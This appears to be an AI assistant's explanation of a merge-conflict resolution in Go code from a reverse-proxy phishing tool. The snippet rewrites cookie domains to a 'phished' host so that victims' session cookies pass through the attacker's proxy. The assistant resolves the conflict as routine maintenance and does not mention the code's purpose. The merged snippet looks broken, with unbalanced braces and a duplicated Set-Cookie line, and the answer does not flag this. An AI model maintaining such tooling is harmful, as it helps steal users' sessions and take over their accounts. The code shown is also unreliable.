The conflict arises because one branch (`HEAD`) has no code in this location, while the other branch (`b4883fe...`) has added a block of commented-out code. This commented code appears to be for debugging or testing how to expire or modify a cookie's security settings.

Since the added code is commented out, it has no effect on the program's functionality. The most reasonable resolution is to assume the developer who added the comments left them there for a reason (e.g., as a reference for future work or debugging) and to include them. This preserves the intent of the `b4883fe...` branch without changing the program's behavior, which aligns with the "no-op" nature of the `HEAD` branch.

```go
							}

				}

				//ck.Secure = false
				//ck.MaxAge = 0
				//if time.Now().Before(ck.Expires) {
				//	ck.Expires, _ = time.Parse("1600-01-01", "1600-01-01")
				//}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())

```
